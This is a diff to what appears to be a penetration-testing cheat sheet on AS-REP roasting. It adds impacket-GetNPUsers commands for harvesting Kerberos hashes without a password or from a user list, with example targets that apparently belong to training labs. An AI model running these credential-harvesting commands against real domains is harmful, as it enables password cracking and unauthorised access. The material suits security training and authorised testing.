@@ -7,9 +7,18 @@
     ```bash
     impacket-GetNPUsers -dc-ip <DomainController_IP>  -request -outputfile <output_file> <Domain/User>
     ```
+- For no password
+   ``` bash
+    impacket-GetNPUsers -dc-ip <DomainController_IP>  -no-pass -outputfile <output_file> <Domain/User>
+   ```
+- You have a list of users
+  ``` bash
+    impacket-GetNPUsers -dc-ip <DomainController_IP>  -no-pass -usersfile <user.lst> -outputfile <output_file> <Domain/>
+  ```
     Example:
 ``` shell
 impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+impacket-GetNPUsers -dc-ip 10.10.10.192  -no-pass -usersfile user.lst -outputfile hhsh blackfield/
 ```
 
 2. **Result**: This command will send AS-REQ requests to the domain controller and retrieve the AS-REP hashes (if preauthentication is disabled for the user accounts). The hashes are saved in Hashcat format in the output file (`hashes.asreproast`).
